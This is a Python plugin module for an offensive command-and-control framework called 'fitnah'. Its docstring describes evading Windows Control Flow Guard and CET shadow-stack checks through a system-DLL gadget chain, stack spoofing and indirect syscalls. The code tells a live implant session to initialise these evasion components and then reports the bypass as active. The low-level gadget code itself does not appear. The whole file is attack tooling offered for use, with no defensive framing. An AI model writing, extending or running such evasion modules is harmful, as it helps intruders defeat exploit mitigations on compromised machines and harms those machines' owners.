"""defense_evasion/cet_cfg_bypass — CFG/CET bypass via stack spoof + indirect syscall combo. MITRE T1036

CFG validates indirect call targets — SpoofCall() routes through a CFG-valid gadget
in a system DLL, bypassing both CFG (valid target) and CET shadow stack checks
(return address points back into the same system DLL gadget chain).
"""
from fitnah.sdk import BasePlugin, ModuleResult, ParamSchema, mitre


class CetCfgBypass(BasePlugin):
    NAME        = "cet_cfg_bypass"
    DESCRIPTION = "Initialize CFG/CET bypass via SpoofInit gadget chain + indirect syscalls. No PowerShell."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1036"
    CATEGORY    = "defense_evasion"
    schema      = ParamSchema()

    @mitre("T1036")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        # Ensure both spoof gadget and indirect syscall are initialized
        r1 = ctx.send("spoof_init", {})
        r2 = ctx.send("hwbp_init",  {})
        ok = r1["status"] == "ok" and r2["status"] == "ok"
        if not ok:
            return ModuleResult.err(f"CFG/CET bypass init failed: {r1['output']} | {r2['output']}")
        return ModuleResult.ok(data="CFG/CET bypass active: SpoofCall gadget + indirect syscalls initialized")
